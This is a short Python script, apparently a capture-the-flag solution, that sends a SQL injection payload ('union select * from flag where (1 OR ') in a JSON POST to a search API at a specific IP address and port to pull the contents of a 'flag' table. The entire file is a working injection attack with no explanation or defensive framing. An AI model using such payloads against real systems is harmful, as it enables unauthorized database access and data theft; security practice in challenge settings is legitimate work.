import requests 

url = "http://34.170.146.252:59655/api/search"

data = {
    "code":["') union select * from flag where (1 OR '", "' = '"]
}

response = requests.post(url, json=data) 
print(response.text)
